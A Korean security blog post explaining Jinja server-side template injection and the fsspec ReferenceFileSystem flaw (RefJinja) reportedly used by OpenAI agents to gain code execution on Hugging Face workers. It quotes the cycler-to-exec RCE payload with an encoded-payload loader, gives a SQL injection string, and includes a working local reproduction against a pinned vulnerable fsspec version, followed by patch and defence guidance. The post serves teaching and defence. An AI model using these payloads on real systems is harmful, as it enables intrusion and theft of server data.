---
title: "OpenAI HuggingFace 해킹 사건 9. Refjinja와 Server Side Template Injection (SSTI)" # 제목 (필수)
excerpt: "이번 해킹 사건에 활용된 Server Side Template Injection" # 서브 타이틀이자 meta description (필수)
date: 2026-09-19 12:41:00 +0900      # 작성일 (필수)
lastmod: 2026-10-05 12:41:00 +0900   # 최종 수정일 (필수)
last_modified_at: 2026-10-05 12:41:00 +0900  # 최종 수정일 (필수)
categories: security       # 다수 카테고리에 포함 가능 (필수)
tags: OpenAI 허깅페이스 Hugging Face HuggingFace AI 에이전트 agent 자율형 해킹 hacking SSTI jinja trmplate injection rce
classes: wide        # wide : 넓은 레이아웃 / 빈칸 : 기본 //// wide 시에는 sticky toc 불가
toc: true        # 목차 표시 여부
toc_label:       # toc 제목
toc_sticky: true # 이동하는 목차 표시 여부 (toc:true 필요) // wide 시에는 sticky toc 불가
header: 
  image:         # 헤더 이미지 (asset내 혹은 url)
  teaser:        # 티저 이미지??
  overlay_image: /assets/images/banners/banner.gif            # 헤더 이미지 (제목과 겹치게)
  # overlay_color: '#333'            # 헤더 배경색 (제목과 겹치게) #333 : 짙은 회색 (필수)
  video:
    id:                      # 영상 ID (URL 뒷부분)
    provider:                # youtube, vimeo 등
sitemap :                    # 구글 크롤링
  changefreq : daily         # 구글 크롤링
  priority : 1.0             # 구글 크롤링
author: # 주인 외 작성자 표기 필요시
permalink: 
sidebar:
  nav: 
pinned: 
series: openai_huggingface_hacking
series_index: 8
---

<!--postNo: 20260919_001--> 

![](/assets/images/20260919_001_004.jpg)  

## Intro  

이전 포스팅([OpenAI Hugging Face 해킹 사건 6. 투트랙 협업 구조](https://whdrns2013.github.io/security/20260914_001_openai_huggingface_ai_hacking_two_track_attacking/))을 다시 한 번 되짚어보자. OpenAI의 에이전트들이 HuggingFace의 Worker를 속여 민감정보와 백엔드 소스코드를 확보하였다. 이후 확보한 소스코드를 분석해 백엔드의 동작 구조를 파악했고, Jinja Template Injection이라는 제로데이 취약점을 이용해서 RCE(원격 코드 실행)에 성공했다.  

그렇다면 Jinja Template Injection이란 무엇이며, 에이전트들은 이를 어떻게 활용해 서버에서 임의의 코드를 실행할 수 있었을까? 이번 포스팅에서는 Jinja와 Template Injection의 기본 원리부터 실제 사건에서 활용된 RefJinja 취약점, 공격 재현 과정, 그리고 이에 대한 보안 대응 방법까지 살펴보도록 한다.  

## Jinja  

### Jinja란 무엇인가  

- Python 기반의 Template Engine  
- 정적 파일에 파이썬 유사 코드를 넣어 동적 컨텐츠를 생성하는 도구  
- Flask, FastAPI 와 같은 웹 프레임워크에서 HTML에 데이터를 넣어 화면을 생성할 때 사용됨  
- `\{\{name\}\}` 과 같은 표현을 통해 전달받은 값이나 간단한 표현식을 처리할 수 있음  

### Template Engine  

- 미리 만들어 둔 템플릿에 데이터를 넣어 최종 문자열이나 문서를 생성하는 도구  
- 웹에서는 주로 HTML을 동적으로 만들 때 사용함 (HTML에 한정된 것은 아님)  


예를 들어 아래와 같은 HTML 템플릿이 있다고 가정해보자.  

```html
<h1>Hello \{\{ name \}\}</h1>
```

여기에 python 서버에서 `name = "철수"` 와 같은 데이터를 전달하면, 화면에는 `name`이라는 문구 대신 `철수` 라는 문구가 표출되는 것이다.  

```python
name = "철수"
```

이러한 과정 중간에는 `렌더링`이라는 작업이 일어나게 된다. 렌더링이란, 템플릿과 데이터를 결합해서 최종 결과물을 만들어내는 과정을 뜻하는데, 바로 Template Engine이 이 렌더링 작업을 수행하는 것이다. 도식으로 나타내면 아래와 같다.  

<pre class='mermaid'>
flowchart LR
    A["Template<br/>Hello \{\{ name \}\}"] --> C["Template Engine<br/>Rendering"]
    B["Data<br/>name = Alice"] --> C
    C --> D["Final Output<br/>Hello Alice"]
</pre>

### Jinja 사용해보기  

Jinja Template Injection을 알아보기 전에, Jinja를 실제로 어떻게 사용하는 것인지 살짝 알아보도록 하자. 우선, python과 함께 사용할 패키지를 설치한다.  

```bash
pip install flask # --> Jinja2 가 의존성으로 설치됨

# uv 사용시
uv add flask 
```

다음으로는 화면에 보여줄 html 코드를 작성해보자. 코드는 `template/` 디렉터리 하위에 생성한다. 디렉터리 구조를 표현해보면 다음과 같다.  

```bash
/
├─ main.py
└─ templates/
   └─ index.html
```

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Jinja Example</title>
</head>
<body>

<h1>Hello \{\{ user.name \}\}</h1>

<p>Age: \{\{ user.age \}\}</p>

{% if user.age >= 20 %}
    <p>Adult</p>
{% else %}
    <p>Minor</p>
{% endif %}

</body>
</html>
```

다음으로는 python 코드인 `main.py` 를 작성해보자. 여기에서는 어떤 경로에 어떤 화면을 표출할지 지정하고, 그 화면에 필요한 데이터를 화면에 제공하도록 한다.  

```python
from flask import Flask, request, render_template_string, render_template

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get("name", "NULL")
    age = request.args.get("age", "0")
    
    user = {
        "name": name,
        "age": int(age)
    }

    return render_template(
        "index.html",
        user = user
    )

if __name__ == "__main__":
    app.run(debug=True)
```

이제 서버를 실행시키고  

```bash
python main.py # 일반적인 경우

# uv 사용시
uv run main.py
```

실행되는 서버 접속 주소를 웹 브라우저에 입력해보면 아래와 같은 화면을 확인할 수 있다.  

```bash
# 접속 주소(파라미터 포함)
http://localhost:5000/?name=철수&age=20
```

![](/assets/images/20260919_001_001.png)  


## Template Injection  

앞서 Jinja와 Template Engine의 동작 방식을 살펴보았다. 그렇다면 이번에는 이러한 Template Engine에서 발생할 수 있는 보안 취약점인 Template Injection에 대해 알아보자.

우선 Template Injection을 이해하기 위해 Injection의 개념부터 살펴보도록 하자.

### Injection이란  

보안쪽 이슈를 살펴보다 보면 Injection이라는 이름이 붙은 공격 기법들을 자주 접할 수 있다. 대표적으로 SQL Injection, NoSQL Injection, Command Injection 등이 있다.   

이러한 Injection 공격의 공통적인 원리는 사용자가 입력한 데이터(Data)와 실행할 명령 또는 코드(Command/Code) 간의 분리 실패이다. 즉, **단순한 데이터로 취급해야 할 사용자 입력이 명령이나 코드의 일부로 해석되는 문제를 악용**하는 것이다.

이를 쉽게 이해하기 위해 SQL Injection을 예로 들어보자. 로그인 기능에서 다음과 같이 사용자의 아이디와 비밀번호를 입력받는다고 가정해보자.  

```bash
ID       : chulsoo
Password : password123
```

서버에서는 입력받은 `ID`와 `Password` 값을 이용해 다음과 같은 SQL을 실행해 로그인 정보를 확인할 것이다. 

```sql
SELECT *
FROM users
WHERE id = 'chulsoo' AND password = 'password123';
```

정상적인 경우에는 사용자가 입력한 `chulsoo`, `password123`이 SQL에서 단순한 데이터로 사용된다.  

<pre class='mermaid'>
flowchart LR
    A["사용자 입력<br/>chulsoo"] --> B["Data"]
    B --> C["SQL Query"]
    C --> D["DB 실행"]

    E["SQL 명령<br/>SELECT ... WHERE id = '...'"] --> C
</pre>

하지만 프로그램에서 SQL 쿼리를 문자열 결합 방식으로 생성할 경우, 문제가 발생할 수 있다. 예를 들면 아래와 같은 코드이다.  

```python
query = (
    "SELECT * FROM users "
    f"WHERE id = '{user_id}' "
    f"AND password = '{password}'"
)
```

이 때 공격자가 아래와 같이 ID에 모든 계정이 반환되도록 하는 쿼리를 입력했다고 가정해보자.  

```bash
ID       : ' OR '1'='1' --
Password : password123
```

이 경우, 코드를 통해 생성된 SQL 쿼리는 다음과 같다.  

```sql
SELECT *
FROM users
WHERE id = '' or '1'='1' --' AND password = 'password123';
```

즉, 원래 쿼리 자체의 의도를 바꿔 `users` 테이블의 모든 유저에 대한 모든 데이터를 반환하도록 하는 무서운 쿼리로 바꿔버린 것이다. 이를 흐름도로 나타내면 다음과 같다.  

<pre class='mermaid'>
flowchart LR
    A["사용자(공격자) 입력<br/>' OR '1'='1' --"] --> B["Data<br/>공격 의도가 담긴 명령"]
    B --> C["Data + SQL 템플릿</br>Data와 SQL 문자열 직접 결합"]
    T["SQL Query 템플릿"] --> C
    C --> D["SQL Query</br> 오염된 SQL Query"]
    D --> E["DB 실행</br>공격자가 원하는 동작"]
</pre>

### Injection의 핵심 원리  


앞서 살펴본 SQL Injection에서는 사용자 입력을 SQL 문자열에 직접 결합하면서 문제가 발생했다. 이러한 문제를 방지하기 위해서는 **사용자 입력을 명령이나 코드에 직접 결합하지 않고, 템플릿(e.g. 쿼리 템플릿)과 별도로 전달해야** 한다. SQL에서는 대표적으로 Prepared Statement와 Parameterized Query를 활용할 수 있다.    

Injection의 핵심은 다음과 같다.

> Injection 공격의 핵심 원리는 데이터(Data)와 명령 또는 코드(Command/Code) 간의 분리 실패이다.  
> 이를 방지하기 위해서는 외부 입력을 명령이나 코드의 일부로 해석하지 않도록 분리하여 처리해야 한다.  

이 원리를 이해했다면 다음에 살펴볼 Template Injection 역시 어렵지 않게 이해할 수 있을 것이다.

### (Jinja) Template Injection이란  

Template Injection 역시 앞서 살펴본 Injection과 기본적인 원리가 같다. **사용자가 입력한 데이터가 단순한 값이 아니라 Template 자체의 일부로 해석될 때 발생하는 취약점**이다. 앞서 Jinja 실습에서 사용했던 코드를 다시 살펴보자.

```python
user = {
    "name": name,
    "age": int(age)
}

return render_template(
    "index.html",  # --> 템플릿
    user = user    # --> 사용자 입력 데이터
)
```

이 코드에서는 Template과 사용자 입력 데이터가 분리되어 있다. 따라서 사용자가 Jinja 표현식을 입력하더라도 해당 값은 일반적인 문자열로 출력된다.

하지만 Template을 Python 코드에서 직접 생성하면서 사용자 입력을 문자열로 결합한다면 어떨까?

```python
user = {
    "name": name,
    "age": int(age)
}

template = f"""
<html>
<head>
    <meta charset="UTF-8">
    <title>Jinja Example</title>
</head>
<body>

<h1>Hello {user.get('name')}</h1>

<p>Age: {user.get('age')}</p>

{'Adult' if user.get('age') >= 20 else 'Minor'}

</body>
</html>
"""

return render_template_string(template)
```

이 코드에서는 사용자 입력인 name이 Python의 f-string을 통해 Template 문자열에 직접 삽입된다. 문제는 **사용자가 입력한 Data가 포함된 문자열 전체를 Jinja Template Engine이 다시 해석한다는 점**이다.

예를 들어 사용자가 name에 다음과 같은 값을 입력했다고 가정해보자.

```python
\{\{7*7\}\}
```

Jinja에서 위와 같은 중괄호 문법은, 표현식을 평가하고 그 결과를 출력하는 문법이다. 따라서 위 입력값이 Template에 직접 삽입되면 다음과 같은 문자열이 생성된다.

```html
<h1>Hello \{\{ 7 * 7 \}\}</h1>
```

즉, 공격자가 입력한 데이터가 단순한 문자열이 아니라 Jinja 표현식으로 해석되어 실행된 것이다. 실제로 브라우저에서 해당 페이지에 접속해보도록 하자.  


```bash
# 웹 브라우저에 입력하는 주소  
http://localhost:5000/?name="\{\{7*7\}\}"&age=20
```

![](/assets/images/20260919_001_002.png)  

위 예시에서는 단순한 수식을 계산했지만, Template Engine에서 접근할 수 있는 객체나 기능에 따라 민감정보를 조회하거나 서버에서 임의의 코드를 실행하는 공격으로 확장될 수도 있다.  

#### (참고) Jinja 표현식   

Jinja에서 자주 사용하는 문법은 다음과 같다.

| 문법          | 의미           | 예시                                         |
| ----------- | ------------ | ------------------------------------------ |
| `\{\{ ... \}\}` | 표현식의 결과 출력   | `\{\{ name \}\}`, `\{\{ 10 + 20 \}\}`              |
| `\{\% ... \%\}` | 조건문·반복문 등 실행 | `\{\% if user \%\}`, `\{\% for item in items \%\}` |
| `\{\# ... \#\}` | 주석           | `\{\# comment \#\}`                            |


### Server Side Template Injection (SSTI)  

**Server Side Template Injection(SSTI)**은 서버에서 동작하는 Template Engine을 대상으로 발생하는 Template Injection을 가리킨다.  

Jinja는 Python 서버에서 동작하는 Server Side Template Engine이므로, Jinja에서 발생하는 Template Injection 역시 SSTI에 해당한다.  

SSTI가 위험한 이유는 공격자의 입력이 **브라우저가 아니라 서버 내부의 Template Engine에서 해석되고 실행된다는 점**이다. 따라서 단순히 화면에 출력되는 값을 조작하는 수준을 넘어, Template Engine이 접근할 수 있는 범위에 따라 서버의 객체, 환경정보, 파일 등의 민감정보에 접근할 수 있다.

또한 Template Engine을 통해 서버 내부의 기능이나 OS 기능까지 접근할 수 있는 경우에는 공격자가 임의의 코드를 실행하는 **RCE(Remote Code Execution; 원격 코드 실행)**로 이어질 수도 있다.

즉, Jinja Template Injection은 SSTI의 한 종류이며, SSTI는 특정 Template Engine에 한정된 공격 기법이 아니라 **서버 측에서 Template을 해석하는 다양한 Template Engine에서 발생할 수 있는 취약점 유형**이다.

## OpenAI HuggingFace 해킹 사건에서의 Template Injection

지금까지 Jinja와 Template Injection의 개념 및 동작 원리를 살펴보았다. 그렇다면 OpenAI의 에이전트들은 이러한 취약점을 어떻게 활용해 Hugging Face 서버에서 원격 코드 실행(RCE)에 성공했을까? 이번에는 실제 사건에서 발견된 RefJinja 취약점과 이를 이용한 공격 과정을 자세히 살펴보도록 하자.  

### RefJinja  

OpenAI 에이전트들이 발견한 Jinja Template 취약점은, Python의 파일시스템 라이브러리인 `fsspec`의 ReferenceFileSystem에서 발생했다. OpenAI는 이 이름을 따라 `RefJinja Template Injection` 이라고 표현했다.  

> (2026-10-06 추가) : 이후 이 취약점은 `CVE-2026-104851`로 등록되었다.   

![](/assets/images/20260919_001_003.png)  

[https://nvd.nist.gov/vuln/detail/cve-2026-104851](https://nvd.nist.gov/vuln/detail/cve-2026-104851)  

> 이 취약점을 가진 ffspec 라이브러리 버전은 >= 0.9.0, <2026.6.0 이며,    
>  현재(2026-10-07) 기준, fsspec을 설치하면 기본적으로 패치된 2026.9.0 버전이 설치된다.       

| 항목 | 내용 |
|---|---|
| CVE | `CVE-2026-104851` |
| 대상 | `fsspec ReferenceFileSystem` |
| 취약점 | Server-Side Template Injection |
| 영향 버전 | `fsspec >= 0.9.0, < 2026.6.0` |
| 수정 버전 | `2026.6.0` |
| 결과 | Arbitrary Python Code Execution / RCE |
| CWE | CWE-1336, CWE-94 |

CVE 설명에 따르면 `ReferenceFileSystem`의 `_render_jinja`, `_process_templates`, `_process_gen` 등에서 외부 Reference JSON의 값을 제한되지 않은 Jinja Template으로 평가할 수 있었으며, Reference 데이터가 실제로 읽히기 전에도 Python 코드 실행이 가능했다.

수정된 `fsspec`에서는 기본적으로 Jinja 해석을 하지 않는 `simple_templates=True` 방식을 사용하며, Jinja가 필요한 처리 과정에서도 `SandboxedEnvironment`를 사용하도록 변경되었다. 현재 공식 문서에서도 단순 Template 방식을 Jinja 해석을 수행하지 않는 안전한 기본 옵션으로 설명하고 있다.

그렇다면, ffspec 라이브러리가 무엇인지, 그리고 왜 갑자기 생뚱맞은 파일시스템 관리 라이브러리인 fsspec에서 SSTI 이야기가 나오는지 살펴보도록 하자.

### fsspec  

#### (1) fsspec 둘러보기  

`fsspec`(Filesystem Spec)은 Python에서 사용할 수 있는 라이브러리로, 로컬, 원격, 임베디드 파일 시스템 및 바이트 저장소에 대해 통합된(unified) 인터페이스를 제공하는 라이브러리이다. 쉽게 말해, **파일이 어떤 저장소에 위치하는지에 관계없이 비슷한 방법으로 접근하고 다룰 수 있게 해주는 라이브러리**인 것이다.  

이번에는 실습을 위해 취약점 패치 전 버전을 설치한다.  

```bash
pip install fsspec==2026.4.0
pip install paramiko # sftp 연결을 위해
```

간단하게 사용법을 알아보자. 우선, fsspec에서 아래와 같이 로컬 파일시스템을 핸들링할 수 있다.  

```python
# Local File System
from fsspec.implementations.local import LocalFileSystem

def local_fs():
    fs = LocalFileSystem()
    print(fs.current().ls("./"))
    
    fs.makedir("./test_dir")
    print(fs.current().ls("./"))
    
    fs.rmdir("./test_dir")
    print(fs.current().ls("./"))

local_fs()
```

```bash
['.../uv.lock', '.../main.py']
['.../uv.lock', '.../main.py', '.../test_dir']
['.../uv.lock', '.../main.py']
```

sftp와 같은 원격지의 파일시스템도 핸들링할 수 있다. 연결만 올바르게 잘 한다면 로컬이든, 원격이든 사용방법은 대동소이하다.  

```python
import fsspec

def sftp_fs():
    fs = fsspec.filesystem(
        "sftp",
        host="192.168.10.10",
        port=22,
        username="user",
        password="strongpassword"
    )
    print(fs.current().ls("./"))
    
    fs.makedir("./test_dir")
    print(fs.current().ls("./"))
    
    fs.rmdir("./test_dir")
    print(fs.current().ls("./"))

sftp_fs()
```

```bash
['~/.ssh', '~/.bash_history', '~/.bashrc']
['~/.ssh', '~/.bash_history', '~/.bashrc', '~/test_dir']
['~/.ssh', '~/.bash_history', '~/.bashrc']
```

#### (2) fsspec.ReferenceFileSystem   

fsspec의 ReferenceFileSystem은 원본 데이터를 직접 저장하는 대신, **다른 파일의 특정 바이트 범위(Byte Range)나 URL을 참조하여 가상 파일처럼 접근할 수 있도록 하는 파일시스템**이다. 즉, 실제 데이터를 복사하거나 별도로 저장하지 않고도, 참조 정보(Reference)를 이용해 원본 데이터의 필요한 부분을 읽어올 수 있다.  

의존성으로 requests와 aiohttp가 있으니 설치해두도록 하자.  

```bash
pip install requests aiohttp
```

ReferenceFileSystem은 다음과 같이 사용할 수 있다.  

```python
def ref_fs():
    references = {
        "version":1,
        "refs":{
            "example1": [
                "https://example.com/",
                0,
                127
                ],
            "example2": [
                "https://google.com/",
                0,
                128
                ]
            }
        }
    
    fs = ReferenceFileSystem(fo=references)
    print(fs.ls(''))
    
    for file in fs.ls(''):
        with fs.open(file.get("name"), "rb") as f:
            print(f.read())

ref_fs()
```

```bash
[{'name': 'example1', 'type': 'file', 'size': 127}, {'name': 'example2', 'type': 'file', 'size': 128}]
b'<!doctype html><html lang=en><head><meta charset=utf-8><link rel=icon href=data:,><meta name=viewport content="width=device-wid'
b'<!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="ko"><head><meta content="text/html; charset=UTF-8" '
```

#### (3) references  

여기서 일단 주목해야 할 지점은 `references`이다. 앞서 든 예시에서 사용한 데이터에 대한 reference는 다음과 같은 구조를 가진다.  

```python
references = {
    "refs": {
        "example": [
            "http://example.com", # (1) target_url : 실제 데이터가 존재하는 파일
            0, # (2) offset : 대상 파일에서 데이터를 읽기 시작할 위치  
            1024 # (3) size: 읽을 데이터의 사이즈  
        ]
    }
}
```

| 값 | 의미 |
|---|---|
| `target_url` | 실제 데이터가 존재하는 파일 |
| `offset` | 해당 파일에서 데이터를 읽기 시작할 위치 |
| `size` | 읽을 데이터의 크기 |

즉, `offset`과 `size`는 일반적으로 숫자값이 사용된다. 하지만 패치 전 `ReferenceFileSystem`에는, 복잡한 Template을 처리하기 위해 **일부 값을 Jinja Template으로 렌더링하는 기능이 존재**한다. 그 취약한 버전에서는 내부적으로 다음과 같이 일반적인 jinja2.Template을 이용해 문자열을 평가했다.

```python
# lib/.../fsspec/implementations/reference.py#ReferenceFileSystem

class ReferenceFileSystem(AsyncFileSystem):

    protocol = "reference"
    cachable = False

    def __init__(
        self,
        fo,
        target=None,
        ref_storage_args=None,
        target_protocol=None,
        target_options=None,
        remote_protocol=None,
        remote_options=None,
        fs=None,
        template_overrides=None,
        simple_templates=True, # ---> 옵션
        max_gap=64_000,
        max_block=256_000_000,
        cache_size=128,
        **kwargs,
    ):

    ...

    def _process_references1(self, references, template_overrides=None):
        if not self.simple_templates or self.templates:
            import jinja2
        self.references = {}
        self._process_templates(references.get("templates", {}))

        @lru_cache(1000)
        def _render_jinja(u): # --> 취약 함수
            return jinja2.Template(u).render(**self.templates)
                       # ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                       # 핵심 취약 지점

        for k, v in references.get("refs", {}).items():
            if isinstance(v, str):
                if v.startswith("base64:"):
                    self.references[k] = base64.b64decode(v[7:])
                self.references[k] = v
            elif isinstance(v, dict):
                self.references[k] = json.dumps(v)
            elif self.templates:
                u = v[0]
                if "\{\{" in u:
                    if self.simple_templates:
                        u = (
                            u.replace("\{\{", "\{")
                            .replace("\}\}", "\}")
                            .format(**self.templates)
                        )
                    else:
                        u = _render_jinja(u) # --> 여기
                self.references[k] = [u] if len(v) == 1 else [u, v[1], v[2]]
            else:
                self.references[k] = v
        self.references.update(self._process_gen(references.get("gen", [])))
```

#### (4) 취약점 이용  

HuggingFace의 글에서 당시 어떻게 공격이 일어났는지 추측할 수 있는 설명이 있다.  

> 두 번째 공격 경로는 서버 측 템플릿 주입으로, 에이전트에게 코드 실행 권한을 부여했습니다. 악의적인 데이터셋 구성은 reference://숫자 오프셋 필드가 실제로는 Jinja2 템플릿인 fsspec 스펙을 사용했습니다. 렌더러가 이를 잘못 평가했고, 에이전트는 표준 Python 객체 그래프를 따라 이동하여 다음 위치에 도달했습니다.

```python
{\{ cycler.__init__.__globals__.__builtins__.exec(
     "import gzip,base64; exec(gzip.decompress(base64.b64decode('<payload>')))"
   ) \}\}
```

OpenAI의 에이전트들은 Hugging Face의 백엔드 소스코드를 분석하던 중, fsspec의 ReferenceFileSystem에서 **외부 입력값이 Jinja Template으로 해석될 수 있는 취약점**을 발견했다. 그리고 이를 악용해 Hugging Face 서버에서 RCE(원격 코드 실행)에 성공했다.  

취약점의 핵심 원리는 앞서 살펴본 Template Injection과 동일하다. 정리하면 다음과 같다.  

- **Jinja** : 전달받은 문자열을 템플릿 자체로 해석해 실행하는 기능이 있다.  
- **fsspec ReferenceFileSystem**: Reference Metadata에 포함된 일부 문자열을 Jinja Template으로 렌더링하는 기능이 존재했다.  

에이전트들은 이 두 가지 특성을 결합했다.  

{% include message-box.html
  label="Agent"
  kind="Agent"
  speed=24
  repeat=true
  repeat_delay=5
  text="fsspec을 사용할 때, Reference Metadata에 우리가 원하는 명령을 실행할 수 있는 Jinja 표현식을 삽입하자!"
%}

이러한 공격 과정을 흐름도로 나타내면 다음과 같다.

<pre class='mermaid'>
flowchart TD
    subgraph ATTACK["공격자 영역"]
        A["악의적인 Reference Metadata 생성"]
        B["Reference에 Jinja 표현식 삽입<br/>\{\{ cycler.__init__... \}\}"]
        A --> B
    end

    subgraph WORKER["Hugging Face Production Worker"]
        C["fsspec.ReferenceFileSystem<br/>Reference Metadata 로딩"]
        D["취약한 Jinja 렌더링 경로 진입"]
        E["Jinja Template Engine<br/>표현식 평가"]
        F["Python 내부 객체 접근<br/>cycler → __globals__ → __builtins__"]
        G["exec() 호출"]
        H["임의의 Python 코드 실행<br/>RCE"]

        C --> D --> E --> F --> G --> H
    end

    B -->|"조작된 Metadata 전달"| C

    style B fill:#fff0d9,stroke:#d97706,color:#92400e
    style D fill:#fff0d9,stroke:#d97706,color:#92400e
    style H fill:#fee2e2,stroke:#dc2626,color:#991b1b
</pre>

즉, 에이전트들은 fsspec의 ReferenceFileSystem에서 발견한 취약점을 이용해, 외부에서 전달한 데이터를 Jinja Template으로 해석하도록 유도했다. 이처럼 fsspec의 Reference 처리 과정에서 발생하는 Jinja Template Injection 취약점 이용했기 때문에 단순히 **Jinja Template Injection**이라고 표현하는 게 아니라, **RefJinja** 공격으로 표현하는 것으로 보인다.  

앞서 살펴본 공격 코드를 보면, Jinja 표현식에서 cycler라는 Python 객체에 접근하는 것을 확인할 수 있다. 이후 객체의 내부 속성을 따라 Python의 내장 함수인 exec()에 접근하고, 이를 이용해 인코딩된 Python 코드를 복원하여 실행한다. 이러한 과정을 통해 **단순한 Template Injection이 서버 내부에서 임의의 코드를 실행하는 RCE로 이어진 것**이다.  

그렇다면 Jinja 표현식에서 어떻게 Python 내부 객체에 접근하고, 나아가 임의의 코드를 실행할 수 있었는지 다음 실습에서 그 과정을 직접 살펴보도록 하자.  

## 취약점 실습  

### 준비  

우선 실습 전에 필요한 패키지들을 설치한다.  

```bash
pip install jinja2 fsspec==2026.4.0 aiohttp paramiko requests
```

그리고 민감한 정보가 담긴 더미 파일(`secret`)을 하나 만들어보자. 공격자는 이 파일의 내용을 읽어들이려고 할 것이다.  

```plaintext
[대외비] 오늘 점심 구내식당 메뉴는 제육볶음입니다.
```

디렉터리 구조는 아래와 같다.  

```bash
.
├── main.py    # fsspec 실행 코드가 포함된 코드파일
├── pyproject.toml
├── secret    # 민감한 정보가 담긴 파일
└── uv.lock
```

### 취약점 원리  

HuggingFace가 밝힌 공격자들의 Jinja Expression 예시를 다시 한 번 살펴보자.  

```python
{\{ cycler.__init__.__globals__.__builtins__.exec(
     "import gzip,base64; exec(gzip.decompress(base64.b64decode('<payload>')))"
   ) \}\}
```

가장 먼저 등장하는 `cycler`는 Jinja에서 기본적으로 사용할 수 있는 객체이다. cycler는 Template에서 여러 값을 순환하면서 사용할 수 있도록 제공되는 기능이나, 이에 대한 정확한 이해는 지금 필요 없다. 중요한 **점은 `cycler`가 단순한 Jinja 문법이 아니라 실제 Python의 `jinja2.utils.Cycler` 클래스라는 것**이다.  

따라서 다음과 같이 Python 객체의 속성을 따라갈 수 있게 되는 것이다.  

```text
cycler
   ↓
Cycler Class
   ↓
__init__
```

그리고 Python에서 직접 정의된 함수 객체는 자신이 정의된 모듈의 전역 Namespace를 `__globals__`라는 속성을 통해 가지고 있다. 따라서 `Cycler` 클래스의 `__init__` 함수에서도 다음과 같은 접근이 가능하다.  

```text
cycler
   ↓
__init__
   ↓
__globals__
   ↓
jinja2.utils 모듈의 Global Namespace
```

Python 모듈의 Global Namespace에는 다시 `__builtins__`가 존재하며, 여기에는 `exec`와 같은 Python의 Built-in 기능이 들어있다. 결과적으로 다음과 같은 객체 탐색이 가능해진 것이다.  

```text
cycler
    ↓
__init__
    ↓
__globals__
    ↓
__builtins__
    ↓
exec()
    ↓
Python Code Execution
```

공격자는 이를 이용해 `exec()`에 도달했고, gzip과 Base64로 인코딩해 둔 Python Payload를 복호화하여 Production Worker 내부에서 실행했다.


### 취약점 재현  

이번 OpenAI Hugging Face 해킹 사건에서 에이전트들이 실제로 어떤 자원을 확보하기 위해 어떤 명령어를 실행했는지, 구체적인 공격 과정까지는 확인할 수 없었다. 하지만 앞서 살펴본 RefJinja 취약점의 핵심 원리를 바탕으로 공격을 재현하는 예제 코드를 작성해보았다.  

아래 코드는 RefJinja 취약점을 이용해 서버 내부의 민감정보 파일을 읽고, 그 내용을 출력하도록 구성해본 실습 예제이다.  

```python
# main.py
from fsspec.implementations.reference import ReferenceFileSystem

def vulnerable():
    
    # 공격자가 조작한 Reference Metadata
    references = {
        "version": 1,
        "templates": {
            "base": "https://example.com"
        },
        "refs": {
            "malicious": [
                "\{\{ cycler.__init__.__globals__.__builtins__.exec(\"f = open('./secret', 'r');key=f.read();print(key);f.close()\") \}\}",
                0,
                100
            ]
        }
    }

    # 취약한 Jinja 렌더링 경로 사용
    fs = ReferenceFileSystem(
        fo=references,
        simple_templates=False
    )

    print(fs.references["malicious"])

def main():
    # local_fs()
    # sftp_fs()
    # ref_fs()
    vulnerable()

if __name__ == "__main__":
    main()
```

이제 코드를 실행시켜보면  

```bash
python main.py
```

아래와 같이 민감정보가 출력되는 것을 볼 수 있다.  

```bash
[대외비] 오늘 점심 구내식당 메뉴는 제육볶음입니다.
['None', 0, 100]
```

## 보안

취약점을 살펴보았으니, 공격에 대비하기 위한 방어 및 보안 향상 방법을 살펴보도록 하자.  

### 1. 신규 fsspec 버전 이용  

가장 먼저, 템플릿 인젝션의 단초를 제공한 fsspec은 취약점 자체를 패치했다. 따라서 fsspec을 사용하는 경우, 2026.6.0 이후 버전을 사용하는 게 안전하다.  

> Don't parse refFS templates by default (#2039, 2029)
> ReferenceFileSystem(refFS)에서 템플릿을 기본적으로 파싱하지 않도록 변경함  

[https://github.com/fsspec/filesystem_spec/blob/master/docs/source/changelog.rst#202660](https://github.com/fsspec/filesystem_spec/blob/master/docs/source/changelog.rst#202660)  

이 말만 보면 근본적으로 template 해석 자체를 막았다는 것인지, 기본적인 템플릿 해석 옵션을 "파싱하지 않음"으로 두었다는 것인지 헷갈린다. 따라서 해당 변경사항과 연관된 2029, 2039 PR을 살펴보도록 하자.  

#### (1) PR 2029 - Honour simple_templates everywhere in referenceFS  

[https://github.com/fsspec/filesystem_spec/pull/2029](https://github.com/fsspec/filesystem_spec/pull/2029)  

PR 2029에서는 _process_gen()에 다음 코드를 추가했다. 참고로 이 PR의 브랜치 이름 자체가 'no-ref-jinja' 다.  

```python
def _process_gen(self, gens):
    out = {}

    if self.simple_templates:
        return out
    ...
```

즉, simple_templates=True일 때 _process_gen()이 Jinja 렌더링 없이 종료하도록 수정한 것이다. 즉, 별도로 `simple_templates=False`를 지정하지 않는 한 해당 경로에서 Jinja 표현식을 평가하지 않는다.  

#### (2) PR 2039 - Small safety improvements  

[https://github.com/fsspec/filesystem_spec/pull/2039](https://github.com/fsspec/filesystem_spec/pull/2039)  

2039 PR에서는 아래와 같은 변경사항을 찾아볼 수 있다.  

- 수정 전  

```python
def _render_jinja(u):
    return jinja2.Template(u).render(**self.templates)
```

- 수정 후

```python
def _render_jinja(u):
    return (
        jinja2.sandbox.SandboxedEnvironment()
        .from_string(u)
        .render(**self.templates)
    )
```

SandboxedEnvironment는 템플릿에서 위험한 Python 내부 속성에 접근하는 것을 제한하도록 한다. 따라서 앞서 실습한 `cycler.__init__.__globals__`와 같은 접근을 차단할 수 있으므로, 보다 안전한 템플릿 파싱 작업을 가능케 한다.  

### 2. 일반적인 SSTI 보안 기법  

두 번째로 살펴볼 것은 일반적인 SSTI 보안 기법이다. 이번 사건이 어떤 라이브러리를 사용했든, 몇 가지의 복합적 공격을 사용했든 결국 핵심은 `SSTI` 기법의 공격이라는 것이다. 즉, **기본적인 SSTI 보안 기법이 적절히 적용된다면 최소한의 방어는 할 수 있을 것**이다.  

#### (1) Template과 Data 분리  

가장 기본적이면서 중요한 방법이다. 앞서 Injection의 핵심 원리를 설명하면서 살펴봤듯, 외부에서 입력받은 Data를 Template 자체에 포함시키지 않고, 별도의 변수로 전달해야 한다.  

```python
from jinja2 import Template

user_input = "\{\{ 7 * 7 \}\}"

# 취약한 방식
template = Template(f"Hello {user_input}")
print(template.render())  # Hello 49

# 안전한 방식
template = Template("Hello \{\{ name \}\}")
print(template.render(name=user_input))  # Hello \{\{ 7 * 7 \}\}
